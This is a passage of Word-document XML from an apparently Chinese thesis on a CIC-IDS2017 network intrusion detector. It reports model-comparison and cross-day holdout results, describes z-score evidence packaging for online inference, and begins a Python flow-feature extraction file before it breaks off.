          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>结论是：混合森林没有显著超过调好的单个 XGBoost，实测反而更低。提升模型本身方差已经很低，再套一层并行平均能压的方差有限，而训练成本翻了几十倍（652.3 s / 10 400 棵 对 12.7 s / 1 800 棵，约 51 倍）；滚动均值 0.9770 低于 XGBoost 的 0.9817，最后 10% 上 0.9362 是五个模型里最低的。它的价值在设计论证而不是指标：说明我们理解 Bagging 与 Boosting 各自降低的是偏差还是方差。这一条在答辩时要主动讲，不能为了“创新点”硬说它最好。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4053A8C9">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>做这个模型的过程中还得到两条比模型本身更有价值的副产物结论。第一，随机特征子集在这里是负优化：max_features="sqrt"（每成员只看 8/78 维）时 reliable macro-F1 为 0.9899，max_features=1.0（每成员看 78 维）时是 0.9986，差 0.0087，比“三个库混不混”重要得多。原因是随机森林的 max_features 是为高方差的深树设计的，树与树去相关后平均能降方差；而提升器是低方差的浅树串行加和，随机砍掉 90% 的特征等于让每轮残差都学偏——它缺的不是方差而是信息。第二，随机划分下五个模型都落在 0.999 附近是划分泄漏，不是模型能力，理由见 3.3.3 节。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C25621D">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.6 跨天留出实验：这是开集问题，不是泛化问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="511CDB99">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>我们还做了按天留出的实验（周一到周四训练、周五测试），结果是失败的。原因是 CIC-IDS2017 的每一类攻击只出现在某一天的抓包文件里（DDoS 与 PortScan 在星期五，DoS Hulk 在星期三），所以按天划分等于把两个类别当成训练时根本没出现过的类别塞给模型。实测闭集口径下 BENIGN 告警率 0.01%，DDoS 60.05%（24 021 条全被判成 DoS Hulk），PortScan 只有 0.47% 被判为非 BENIGN；二分类口径下准确率 0.4982、攻击召回 0.3506、攻击精确率 0.9999。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2752407D">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>精确率 0.9999 配召回 0.35，说明模型只对自己见过的形状开口。这条结论要修正的是说法而不是结论本身：按天划分测出来的主要是开集失败，谈泛化应当用类内按时间的前向滚动验证，谈开集就显式写成一条结论。这也正是在线路径必须保留大模型层的实测依据——小模型遇到没见过的形状时既不报警也不报错，只有把证据交给大模型才能说清“这条流是什么”[16]。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FD8523">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.7 在线推理封装</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FB2C83">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在线推理由 center/inference.py 的 Detector 负责三件事：加载 best_model.pkl 与 feature_schema.json、做批推理、把偏离训练分布最大的若干特征打包成“证据”交给下游。第三件事是这一层最容易被忽略的部分——分类器的原始输出只有一个类别名和一个概率，大模型拿到它写不出证据链，必须补上“是哪几个特征的取值远离了训练分布、偏离多少个标准差”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728DDB1C">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>证据打包的判据是 z 分数：对每个特征计算 (当前值 − 训练均值) / 训练标准差，取绝对值最大的若干项。这里有一个必须交代的限制：z 分数只说明“偏离多少”，不说明“往哪个方向才是攻击”。所以证据的措辞是“PSH Flag Count = 1.0，偏离训练分布 1.228 个标准差”，而不是“PSH 异常”；是否异常由类别判定回答，z 分数只提供量化的偏离度。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133B1C36">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.3.8 本部分完整代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F96E7A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>以下五个文件为本部分全部代码，按“特征 → 在线推理 → 训练与选型 → 第五个模型”的顺序排列。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC649EC">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-14　probe/features.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（452 行）　M2 78 维特征提取</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4214433B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M2 流量特征工程：把抓到的包聚成双向流，算出 CICFlowMeter 口径的 78 维特征。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="095A839E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57325399">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>为什么必须对着 CICFlowMeter 的口径复刻：模型是用 CIC-IDS2017 训的，那份数据由 CICFlowMeter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369BF955">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>（Java 版）生成。字段名一样但定义不同，线上推理就是拿着分布不同的输入去问一个只在训练分布</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395D5753">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>上见过的模型——不会报错，只会静默误判。所以本文件逐字段对齐，并在有歧义的地方写明取舍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EBA8428">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E0E6C12">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>口径约定（对应 CICFlowMeter 的实现）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BD7185">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61A62CD0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **流的方向**由首个包决定。首个包的方向为 forward（fwd），反方向为 backward（bwd）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3376100D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  同一个五元组两个方向共用一个流对象，不拆成两条单向流。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD027B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **时间单位**：Flow Duration、IAT、Active/Idle 全部是**微秒**，与数据集一致。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5A8910">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **包长**用 IP 总长度（含 IP 头与传输层头），不是载荷长度。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1437A437">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **Active/Idle**：包间隔 &gt;= 5 s 视为进入空闲期，把流切成若干活跃期和空闲期，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E5A172">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  再对各自的长度做 Mean/Std/Max/Min。只有一个包时活跃期为 0。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19061AF0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **Bulk 六个字段（Fwd/Bwd Avg Bytes/Packets/Bulk Rate）在 CIC-IDS2017 里恒为 0**，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A19C1ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  本项目实测确认（25 万行样本该六列唯一值只有 0），故输出 0.0 而不是另造一套定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C58074C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **Subflow 字段**：CICFlowMeter 把遇到 FIN/RST 就截止的一段算作一个 subflow。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352190EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  本实现一个流不拆分 subflow，因此 Subflow 数值等于整条流的累计值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDA2B9F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>- **Fwd Header Length.1** 在原数据里是 "Fwd Header Length" 的重复列（实测逐行相等），输出同一个值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D06B68">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0742D65F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>本模块不依赖 scapy：抓包层把包解析成 PacketRecord 再喂进来，这样特征逻辑可以脱离</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7A8836">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>抓包权限、脱离真实网卡做单元测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D75E3D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C403A8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D7BF66C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1360CAA5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E721C7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040C42E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from collections import OrderedDict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52635BC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from dataclasses import dataclass, field</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FD5010">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from typing import Iterable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31282C21">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="603D003D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 78 维特征名，顺序必须与 models/artifacts/feature_schema.json 一致</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B1686F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FEATURE_ORDER = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75294B00">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Destination Port",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3833D2CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow Duration",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE02753">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Total Fwd Packets",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6FB8FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Total Backward Packets",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8EFF70">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Total Length of Fwd Packets",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCFB799">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Total Length of Bwd Packets",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCD34F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Packet Length Max",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0438D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Packet Length Min",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7B3D54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Packet Length Mean",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B740F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Packet Length Std",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194BC3B1">
